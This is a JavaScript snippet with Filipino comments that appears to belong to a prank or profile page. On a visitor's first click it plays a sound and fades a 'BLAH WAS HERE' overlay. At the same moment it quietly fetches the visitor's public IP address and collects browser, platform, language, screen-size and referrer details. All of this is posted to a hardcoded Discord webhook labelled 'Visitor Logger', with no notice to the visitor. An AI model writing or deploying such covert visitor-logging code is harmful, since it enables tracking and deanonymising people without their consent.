<script>
const audio = document.getElementById('bgSound');
audio.volume = 0.4; // Lakas: 0.1 (mahina) hanggang 1 (malakas)

// ✅ ILAGAY MO DITO ANG LINK NG DISCORD WEBHOOK MO
const WEBHOOK_URL = "https://discord.com/api/webhooks/1519198591900717307/hWliSDMI9K5NmjOS4-rMmcdofcdbWXhJCF_Zcc34Si35-sjRSEjwSrJGMyVH-mQGxyqJ";

// ✅ IDINAGDAG: Lahat ng aksyon pagka-click
document.addEventListener('click', () => {
  // Patugtugin ang tunog
  audio.play().catch(err => console.log("Hindi tumugtog:", err));

  // Ipakita at i-fade out ang "BLAH WAS HERE"
  const overlay = document.getElementById('blahOverlay');
  setTimeout(() => {
    overlay.classList.add('fade-out');
  }, 800); // Lalabas ng 0.8 segundo bago mawala

  // Kuhain at ipadala ang impormasyon sa Webhook
  sendVisitorInfo();

}, { once: true }); // Gagana lang isang beses

// ✅ IDINAGDAG: Function para kumuha at magpadala ng impormasyon
async function sendVisitorInfo() {
  try {
    // Kuhain ang pampublikong IP address
    const ipRes = await fetch('https://api.ipify.org?format=json');
    const ipData = await ipRes.json();
    const visitorIP = ipData.ip;

    // Detalye ng browser at device
    const userAgent = navigator.userAgent;
    const language = navigator.language;
    const platform = navigator.platform;
    const viewport = `${window.innerWidth}x${window.innerHeight}`;
    const referrer = document.referrer || "Direktang binuksan";

    // Ihanda ang mensahe para sa Discord
    const payload = {
      username: "Visitor Logger",
      avatar_url: "https://i.imgur.com/ZmspxIl.png",
      embeds: [{
        title: "🔍 BAGONG BISITA",
        color: 1003621, // Kulay lila
        fields: [
          { name: "👤 Sinong bumisita", value: "Mula sa link/profile ni BLAH", inline: false },
          { name: "🌐 IP Address", value: `||${visitorIP}||`, inline: true },
          { name: "💻 Device/OS", value: platform, inline: true },
          { name: "🌍 Browser", value: userAgent, inline: false },
          { name: "🗣️ Wika", value: language, inline: true },
          { name: "📏 Screen Size", value: viewport, inline: true },
          { name: "🔗 Galing sa", value: referrer, inline: false }
        ],
        timestamp: new Date().toISOString()
      }]
    };

    // Ipadala sa Webhook
    await fetch(WEBHOOK_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload)
    });

    console.log("Impormasyon naipadala sa Webhook");

  } catch (err) {
    console.log("Error sa pagkuha/pagpadala:", err);
  }
}
</script>
